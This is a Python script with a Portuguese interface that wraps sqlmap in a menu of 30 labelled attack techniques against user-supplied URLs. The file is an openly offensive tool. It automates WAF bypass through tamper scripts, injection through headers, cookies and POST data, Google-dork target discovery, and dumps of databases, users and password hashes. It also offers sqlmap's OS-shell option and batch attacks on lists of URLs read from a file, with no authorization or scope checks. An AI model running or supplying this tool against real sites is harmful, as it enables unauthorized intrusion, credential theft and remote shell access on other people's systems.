#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import random
from pathlib import Path

# Verificar se colorama está disponível, se não, usar fallback
try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False
    # Fallback para cores básicas
    class Fore:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        RESET = '\033[0m'
    
    class Back:
        RED = '\033[41m'
        GREEN = '\033[42m'
        YELLOW = '\033[43m'
        BLUE = '\033[44m'
        MAGENTA = '\033[45m'
        CYAN = '\033[46m'
        WHITE = '\033[47m'
        RESET = '\033[0m'
    
    class Style:
        BRIGHT = '\033[1m'
        DIM = '\033[2m'
        NORMAL = '\033[0m'
        RESET_ALL = '\033[0m'

class SQLMapAutomator:
    def __init__(self):
        self.sqlmap_path = self._find_sqlmap()
        self.target_url = ""
        self.techniques = {
            1: {"name": "SQL Injection Básica", "command": "--technique=BEU"},
            2: {"name": "Boolean Based Blind", "command": "--technique=B"},
            3: {"name": "Time Based Blind", "command": "--technique=T"},
            4: {"name": "Error Based", "command": "--technique=E"},
            5: {"name": "UNION Query", "command": "--technique=U"},
            6: {"name": "Stacked Queries", "command": "--technique=S"},
            7: {"name": "Heavy Detection", "command": "--level=5 --risk=3"},
            8: {"name": "WAF Bypass", "command": "--tamper=space2comment"},
            9: {"name": "Tamper Scripts Multiplos", "command": "--tamper=between,charencode"},
            10: {"name": "Fuzzing Avançado", "command": "--test-filter=GENERIC"},
            11: {"name": "Injeção em Headers", "command": "--headers=\"X-Forwarded-For: *\""},
            12: {"name": "User Agent Injection", "command": "--random-agent"},
            13: {"name": "Referer Injection", "command": "--referer=*"},
            14: {"name": "Cookie Injection", "command": "--cookie=\"*\" --level=2"},
            15: {"name": "Form Data Injection", "command": "--data=\"*\" --method=POST"},
            16: {"name": "JSON Injection", "command": "--data=\"*\" --headers=\"Content-Type: application/json\""},
            17: {"name": "XML Injection", "command": "--data=\"*\" --headers=\"Content-Type: application/xml\""},
            18: {"name": "Multi-threaded Attack", "command": "--threads=10"},
            19: {"name": "Crawling + Injection", "command": "--crawl=2"},
            20: {"name": "Google Dork Scan", "command": "--google-dork \"inurl:.php?id=\""},
            21: {"name": "Database Enumeration", "command": "--dbs"},
            22: {"name": "Table Enumeration", "command": "--tables"},
            23: {"name": "Column Enumeration", "command": "--columns"},
            24: {"name": "Data Dump", "command": "--dump"},
            25: {"name": "Schema Enumeration", "command": "--schema"},
            26: {"name": "User Enumeration", "command": "--users"},
            27: {"name": "Password Hash Dump", "command": "--passwords"},
            28: {"name": "Privilege Escalation", "command": "--privileges"},
            29: {"name": "OS Shell", "command": "--os-shell"},
            30: {"name": "Ataque Completo", "command": "--all"}
        }
        
        self.tamper_scripts = {
            1: "space2comment",
            2: "between",
            3: "charencode", 
            4: "randomcase",
            5: "charunicodeencode",
            6: "equaltolike",
            7: "greatest",
            8: "ifnull2ifisnull",
            9: "modsecurityversioned",
            10: "space2plus",
            11: "bluecoat",
            12: "halfversionedmorekeywords",
            13: "space2randomblank",
            14: "versionedmorekeywords",
            15: "apostrophemask"
        }

    def _find_sqlmap(self):
        """Encontra o caminho do SQLMap"""
        paths = [
            "/usr/bin/sqlmap",
            "/usr/local/bin/sqlmap", 
            "/opt/sqlmap/sqlmap.py",
            "./sqlmap/sqlmap.py",
            "sqlmap",
            "sqlmap.py"
        ]
        
        for path in paths:
            if os.path.exists(path) or self._check_command(path):
                return path
        
        print(f"{Fore.RED}[!] SQLMap não encontrado!")
        print(f"{Fore.YELLOW}[*] Instale o SQLMap primeiro:")
        print(f"{Fore.CYAN}    git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git")
        print(f"{Fore.CYAN}    ou")
        print(f"{Fore.CYAN}    sudo apt install sqlmap")
        sys.exit(1)

    def _check_command(self, cmd):
        """Verifica se um comando existe"""
        try:
            subprocess.run([cmd, "--version"], capture_output=True, timeout=5)
            return True
        except:
            return False

    def clear_screen(self):
        """Limpa a tela"""
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_banner(self):
        """Imprime banner colorido"""
        banner = f"""
{Fore.RED}
███████╗ ██████╗ ██╗     {Fore.CYAN}███╗   ███╗ █████╗ ██████╗ 
██╔════╝██╔═══██╗██║     {Fore.CYAN}████╗ ████║██╔══██╗██╔══██╗
███████╗██║   ██║██║     {Fore.CYAN}██╔████╔██║███████║██████╔╝
╚════██║██║   ██║██║     {Fore.CYAN}██║╚██╔╝██║██╔══██║██╔═══╝ 
███████║╚██████╔╝███████╗{Fore.CYAN}██║ ╚═╝ ██║██║  ██║██║     
╚══════╝ ╚═════╝ ╚══════╝{Fore.CYAN}╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     
                                                                
{Fore.GREEN}        SQLMAP AUTOMATOR - 30 TÉCNICAS DE ATAQUE
{Fore.YELLOW}           By: Security Toolkit v2.0
{Style.RESET_ALL}
"""
        print(banner)

    def print_menu(self):
        """Imprime menu principal"""
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                     MENU PRINCIPAL                           ║")
        print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════╣")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}[1]{Fore.WHITE}  Configurar Target URL          {Fore.CYAN}║ {Fore.YELLOW}[2]{Fore.WHITE}  Listar Técnicas              {Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}[3]{Fore.WHITE}  Ataque Rápido                 {Fore.CYAN}║ {Fore.YELLOW}[4]{Fore.WHITE}  Ataque Personalizado         {Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}[5]{Fore.WHITE}  Multi-Técnicas                {Fore.CYAN}║ {Fore.YELLOW}[6]{Fore.WHITE}  Tamper Scripts               {Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}[7]{Fore.WHITE}  Scan Automático               {Fore.CYAN}║ {Fore.YELLOW}[8]{Fore.WHITE}  Batch Mode                   {Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}[9]{Fore.WHITE}  Configurações Avançadas       {Fore.CYAN}║ {Fore.YELLOW}[10]{Fore.WHITE} Sair                         {Fore.CYAN}║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝")
        print(f"{Fore.GREEN}Target Atual: {Fore.WHITE}{self.target_url if self.target_url else 'Nenhum'}")
        print(f"{Fore.CYAN}════════════════════════════════════════════════════════════════")

    def set_target_url(self):
        """Configura a URL alvo"""
        self.clear_screen()
        self.print_banner()
        print(f"{Fore.YELLOW}[*] Configurar Target URL")
        print(f"{Fore.CYAN}═" * 50)
        
        url = input(f"{Fore.GREEN}[?] Digite a URL alvo: {Fore.WHITE}")
        if url:
            self.target_url = url
            print(f"{Fore.GREEN}[+] Target configurado: {self.target_url}")
        else:
            print(f"{Fore.RED}[-] URL inválida!")
        
        input(f"{Fore.YELLOW}[*] Pressione Enter para continuar...")

    def list_techniques(self):
        """Lista todas as técnicas disponíveis"""
        self.clear_screen()
        self.print_banner()
        print(f"{Fore.YELLOW}[*] Lista de Técnicas de Ataque")
        print(f"{Fore.CYAN}═" * 80)
        
        for i in range(1, 31):
            tech = self.techniques[i]
            print(f"{Fore.GREEN}[{i:2d}]{Fore.WHITE} {tech['name']:30} {Fore.CYAN}{tech['command']}")
        
        print(f"{Fore.CYAN}═" * 80)
        input(f"{Fore.YELLOW}[*] Pressione Enter para continuar...")

    def quick_attack(self):
        """Ataque rápido com técnica padrão"""
        if not self.target_url:
            print(f"{Fore.RED}[!] Configure o target primeiro!")
            time.sleep(2)
            return
        
        self.clear_screen()
        self.print_banner()
        print(f"{Fore.YELLOW}[*] Ataque Rápido")
        print(f"{Fore.CYAN}═" * 50)
        print(f"{Fore.GREEN}[+] Target: {self.target_url}")
        
        techniques = [
            (1, "SQL Injection Básica"),
            (7, "Heavy Detection"), 
            (18, "Multi-threaded"),
            (30, "Ataque Completo")
        ]
        
        for num, name in techniques:
            print(f"{Fore.GREEN}[{num}]{Fore.WHITE} {name}")
        
        try:
            choice = int(input(f"{Fore.GREEN}[?] Escolha técnica [1-4]: {Fore.WHITE}"))
            if choice in [1, 7, 18, 30]:
                self.execute_attack(choice)
            else:
                print(f"{Fore.RED}[-] Opção inválida!")
        except ValueError:
            print(f"{Fore.RED}[-] Entrada inválida!")

    def custom_attack(self):
        """Ataque personalizado"""
        if not self.target_url:
            print(f"{Fore.RED}[!] Configure o target primeiro!")
            time.sleep(2)
            return
        
        self.clear_screen()
        self.print_banner()
        print(f"{Fore.YELLOW}[*] Ataque Personalizado")
        print(f"{Fore.CYAN}═" * 50)
        print(f"{Fore.GREEN}[+] Target: {self.target_url}")
        
        # Mostrar técnicas
        for i in range(1, 16):
            tech = self.techniques[i]
            print(f"{Fore.GREEN}[{i:2d}]{Fore.WHITE} {tech['name']}")
        
        try:
            choice = int(input(f"{Fore.GREEN}[?] Escolha técnica [1-30]: {Fore.WHITE}"))
            if 1 <= choice <= 30:
                self.execute_attack(choice)
            else:
                print(f"{Fore.RED}[-] Opção inválida!")
        except ValueError:
            print(f"{Fore.RED}[-] Entrada inválida!")

    def multi_technique_attack(self):
        """Ataque com múltiplas técnicas"""
        if not self.target_url:
            print(f"{Fore.RED}[!] Configure o target primeiro!")
            time.sleep(2)
            return
        
        self.clear_screen()
        self.print_banner()
        print(f"{Fore.YELLOW}[*] Ataque Multi-Técnicas")
        print(f"{Fore.CYAN}═" * 50)
        print(f"{Fore.GREEN}[+] Target: {self.target_url}")
        
        print(f"{Fore.YELLOW}[*] Selecione as técnicas (ex: 1,3,5,7):")
        for i in range(1, 31, 2):
            tech1 = self.techniques[i]
            tech2 = self.techniques[i+1] if i+1 <= 30 else ""
            if tech2:
                print(f"{Fore.GREEN}[{i:2d}]{Fore.WHITE} {tech1['name']:30} {Fore.GREEN}[{i+1:2d}]{Fore.WHITE} {tech2['name']}")
            else:
                print(f"{Fore.GREEN}[{i:2d}]{Fore.WHITE} {tech1['name']}")
        
        try:
            choices = input(f"{Fore.GREEN}[?] Técnicas: {Fore.WHITE}")
            tech_list = [int(x.strip()) for x in choices.split(',') if x.strip().isdigit()]
            
            valid_techs = [t for t in tech_list if 1 <= t <= 30]
            if valid_techs:
                self.execute_multi_attack(valid_techs)
            else:
                print(f"{Fore.RED}[-] Nenhuma técnica válida selecionada!")
        except ValueError:
            print(f"{Fore.RED}[-] Entrada inválida!")

    def tamper_scripts_menu(self):
        """Menu de tamper scripts"""
        self.clear_screen()
        self.print_banner()
        print(f"{Fore.YELLOW}[*] Tamper Scripts - WAF Bypass")
        print(f"{Fore.CYAN}═" * 50)
        
        for i in range(1, 16):
            print(f"{Fore.GREEN}[{i:2d}]{Fore.WHITE} {self.tamper_scripts[i]}")
        
        print(f"{Fore.CYAN}═" * 50)
        print(f"{Fore.YELLOW}[*] Use tamper scripts para bypass de WAF")
        
        if not self.target_url:
            print(f"{Fore.RED}[!] Configure o target primeiro!")
            time.sleep(2)
            return
        
        try:
            choice = int(input(f"{Fore.GREEN}[?] Escolha tamper script [1-15]: {Fore.WHITE}"))
            if 1 <= choice <= 15:
                self.execute_tamper_attack(choice)
            else:
                print(f"{Fore.RED}[-] Opção inválida!")
        except ValueError:
            print(f"{Fore.RED}[-] Entrada inválida!")

    def auto_scan(self):
        """Scan automático"""
        if not self.target_url:
            print(f"{Fore.RED}[!] Configure o target primeiro!")
            time.sleep(2)
            return
        
        self.clear_screen()
        self.print_banner()
        print(f"{Fore.YELLOW}[*] Scan Automático")
        print(f"{Fore.CYAN}═" * 50)
        print(f"{Fore.GREEN}[+] Target: {self.target_url}")
        
        print(f"{Fore.YELLOW}[*] Iniciando scan automático...")
        print(f"{Fore.CYAN}[*] Esta operação pode demorar vários minutos...")
        
        # Comando de scan automático
        cmd = [
            self.sqlmap_path,
            "-u", self.target_url,
            "--batch",
            "--level=3",
            "--risk=2",
            "--random-agent",
            "--threads=5"
        ]
        
        self.run_command(cmd)

    def batch_mode(self):
        """Modo batch com múltiplos targets"""
        self.clear_screen()
        self.print_banner()
        print(f"{Fore.YELLOW}[*] Batch Mode - Múltiplos Targets")
        print(f"{Fore.CYAN}═" * 50)
        
        print(f"{Fore.YELLOW}[1] Importar de arquivo")
        print(f"{Fore.YELLOW}[2] Digitar URLs manualmente")
        
        try:
            choice = int(input(f"{Fore.GREEN}[?] Opção: {Fore.WHITE}"))
            
            if choice == 1:
                filename = input(f"{Fore.GREEN}[?] Nome do arquivo: {Fore.WHITE}")
                self.batch_from_file(filename)
            elif choice == 2:
                self.batch_manual()
            else:
                print(f"{Fore.RED}[-] Opção inválida!")
                
        except ValueError:
            print(f"{Fore.RED}[-] Entrada inválida!")

    def batch_from_file(self, filename):
        """Processa batch de arquivo"""
        try:
            with open(filename, 'r') as f:
                urls = [line.strip() for line in f if line.strip()]
            
            print(f"{Fore.GREEN}[+] {len(urls)} URLs carregadas")
            
            for i, url in enumerate(urls, 1):
                print(f"{Fore.CYAN}[*] Processando {i}/{len(urls)}: {url}")
                self.target_url = url
                self.execute_attack(1)  # Ataque básico para cada URL
                
        except FileNotFoundError:
            print(f"{Fore.RED}[-] Arquivo não encontrado!")
        except Exception as e:
            print(f"{Fore.RED}[-] Erro: {e}")

    def batch_manual(self):
        """Batch com entrada manual"""
        print(f"{Fore.YELLOW}[*] Digite as URLs (uma por linha, linha vazia para terminar):")
        urls = []
        
        while True:
            url = input(f"{Fore.GREEN}URL {len(urls)+1}: {Fore.WHITE}")
            if not url:
                break
            urls.append(url)
        
        if urls:
            for i, url in enumerate(urls, 1):
                print(f"{Fore.CYAN}[*] Processando {i}/{len(urls)}: {url}")
                self.target_url = url
                self.execute_attack(1)

    def advanced_settings(self):
        """Configurações avançadas"""
        self.clear_screen()
        self.print_banner()
        print(f"{Fore.YELLOW}[*] Configurações Avançadas")
        print(f"{Fore.CYAN}═" * 50)
        
        print(f"{Fore.YELLOW}[1] Configurar Proxy")
        print(f"{Fore.YELLOW}[2] Configurar User-Agent")
        print(f"{Fore.YELLOW}[3] Configurar Delay")
        print(f"{Fore.YELLOW}[4] Configurar Timeout")
        print(f"{Fore.YELLOW}[5] Voltar")
        
        try:
            choice = int(input(f"{Fore.GREEN}[?] Opção: {Fore.WHITE}"))
            if choice == 1:
                self.set_proxy()
            elif choice == 2:
                self.set_user_agent()
            elif choice == 3:
                self.set_delay()
            elif choice == 4:
                self.set_timeout()
            elif choice == 5:
                return
            else:
                print(f"{Fore.RED}[-] Opção inválida!")
        except ValueError:
            print(f"{Fore.RED}[-] Entrada inválida!")

    def set_proxy(self):
        """Configura proxy"""
        proxy = input(f"{Fore.GREEN}[?] Proxy (ex: http://127.0.0.1:8080): {Fore.WHITE}")
        if proxy:
            self.proxy = proxy
            print(f"{Fore.GREEN}[+] Proxy configurado: {proxy}")

    def set_user_agent(self):
        """Configura user agent"""
        ua = input(f"{Fore.GREEN}[?] User-Agent personalizado: {Fore.WHITE}")
        if ua:
            self.user_agent = ua
            print(f"{Fore.GREEN}[+] User-Agent configurado")

    def set_delay(self):
        """Configura delay entre requests"""
        try:
            delay = float(input(f"{Fore.GREEN}[?] Delay em segundos: {Fore.WHITE}"))
            self.delay = delay
            print(f"{Fore.GREEN}[+] Delay configurado: {delay}s")
        except ValueError:
            print(f"{Fore.RED}[-] Valor inválido!")

    def set_timeout(self):
        """Configura timeout"""
        try:
            timeout = int(input(f"{Fore.GREEN}[?] Timeout em segundos: {Fore.WHITE}"))
            self.timeout = timeout
            print(f"{Fore.GREEN}[+] Timeout configurado: {timeout}s")
        except ValueError:
            print(f"{Fore.RED}[-] Valor inválido!")

    def execute_attack(self, technique_id):
        """Executa um ataque específico"""
        tech = self.techniques[technique_id]
        
        print(f"{Fore.GREEN}[+] Iniciando ataque: {tech['name']}")
        print(f"{Fore.CYAN}[*] Técnica: {tech['command']}")
        print(f"{Fore.YELLOW}[*] Target: {self.target_url}")
        
        # Construir comando
        cmd = [self.sqlmap_path, "-u", self.target_url, "--batch"]
        cmd.extend(tech['command'].split())
        
        # Adicionar configurações avançadas se existirem
        if hasattr(self, 'proxy'):
            cmd.extend(["--proxy", self.proxy])
        if hasattr(self, 'user_agent'):
            cmd.extend(["--user-agent", self.user_agent])
        if hasattr(self, 'delay'):
            cmd.extend(["--delay", str(self.delay)])
        if hasattr(self, 'timeout'):
            cmd.extend(["--timeout", str(self.timeout)])
        
        self.run_command(cmd)

    def execute_multi_attack(self, techniques):
        """Executa múltiplas técnicas"""
        print(f"{Fore.GREEN}[+] Iniciando ataque multi-técnicas")
        print(f"{Fore.YELLOW}[*] Técnicas selecionadas: {techniques}")
        
        # Combinar comandos
        all_commands = []
        for tech_id in techniques:
            tech = self.techniques[tech_id]
            all_commands.extend(tech['command'].split())
        
        # Remover duplicatas
        unique_commands = []
        for cmd in all_commands:
            if cmd not in unique_commands:
                unique_commands.append(cmd)
        
        cmd = [self.sqlmap_path, "-u", self.target_url, "--batch"]
        cmd.extend(unique_commands)
        
        self.run_command(cmd)

    def execute_tamper_attack(self, tamper_id):
        """Executa ataque com tamper script"""
        tamper = self.tamper_scripts[tamper_id]
        
        print(f"{Fore.GREEN}[+] Iniciando ataque com tamper: {tamper}")
        
        cmd = [
            self.sqlmap_path,
            "-u", self.target_url,
            "--batch",
            "--tamper", tamper,
            "--level=3",
            "--risk=2"
        ]
        
        self.run_command(cmd)

    def run_command(self, cmd):
        """Executa comando SQLMap"""
        print(f"{Fore.CYAN}[*] Executando: {' '.join(cmd)}")
        print(f"{Fore.YELLOW}═" * 80)
        
        try:
            # Executar comando
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            # Mostrar output em tempo real
            for line in process.stdout:
                line = line.strip()
                if line:
                    # Colorir output baseado no conteúdo
                    if "sqlmap resumed" in line.lower():
                        print(f"{Fore.GREEN}{line}")
                    elif "payload:" in line.lower():
                        print(f"{Fore.RED}{line}")
                    elif "testing" in line.lower():
                        print(f"{Fore.YELLOW}{line}")
                    elif "vulnerable" in line.lower():
                        print(f"{Fore.RED}{Back.WHITE}{line}")
                    else:
                        print(f"{Fore.WHITE}{line}")
            
            process.wait()
            print(f"{Fore.YELLOW}═" * 80)
            
            if process.returncode == 0:
                print(f"{Fore.GREEN}[+] Ataque concluído com sucesso!")
            else:
                print(f"{Fore.RED}[-] Ataque finalizado com código: {process.returncode}")
                
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}[!] Ataque interrompido pelo usuário")
        except Exception as e:
            print(f"{Fore.RED}[-] Erro ao executar comando: {e}")
        
        input(f"{Fore.YELLOW}[*] Pressione Enter para continuar...")

    def main_loop(self):
        """Loop principal"""
        while True:
            self.clear_screen()
            self.print_banner()
            self.print_menu()
            
            try:
                choice = input(f"{Fore.GREEN}[?] Selecione uma opção [1-10]: {Fore.WHITE}")
                
                if choice == "1":
                    self.set_target_url()
                elif choice == "2":
                    self.list_techniques()
                elif choice == "3":
                    self.quick_attack()
                elif choice == "4":
                    self.custom_attack()
                elif choice == "5":
                    self.multi_technique_attack()
                elif choice == "6":
                    self.tamper_scripts_menu()
                elif choice == "7":
                    self.auto_scan()
                elif choice == "8":
                    self.batch_mode()
                elif choice == "9":
                    self.advanced_settings()
                elif choice == "10":
                    print(f"{Fore.GREEN}[+] Saindo...")
                    break
                else:
                    print(f"{Fore.RED}[-] Opção inválida!")
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f"{Fore.YELLOW}\n[!] Saindo...")
                break
            except Exception as e:
                print(f"{Fore.RED}[-] Erro: {e}")
                time.sleep(2)

def main():
    """Função principal"""
    try:
        automator = SQLMapAutomator()
        automator.main_loop()
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}\n[!] Programa interrompido")
    except Exception as e:
        print(f"{Fore.RED}[-] Erro fatal: {e}")

if __name__ == "__main__":
    main()
